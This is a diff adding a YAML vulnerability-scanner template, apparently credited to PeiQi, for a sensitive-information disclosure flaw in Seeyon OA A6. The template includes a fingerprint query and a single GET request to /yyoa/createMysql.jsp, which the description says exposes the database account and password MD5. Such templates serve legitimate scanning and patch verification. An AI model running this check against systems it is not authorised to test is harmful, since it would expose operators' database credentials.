@@ -1,0 +1,19 @@
+name: Seeyon OA A6 createMysql.jsp Disclosure of database sensitive information
+manual: true
+query: app="Yonyou-Seeyon-OA" && body="致远协创A6"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /yyoa/createMysql.jsp
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: Seeyon OA A6 has database sensitive information disclosure. Attackers
+    can obtain database account and password MD5 by accessing specific URL
+  tags: Disclosure of Sensitive Information
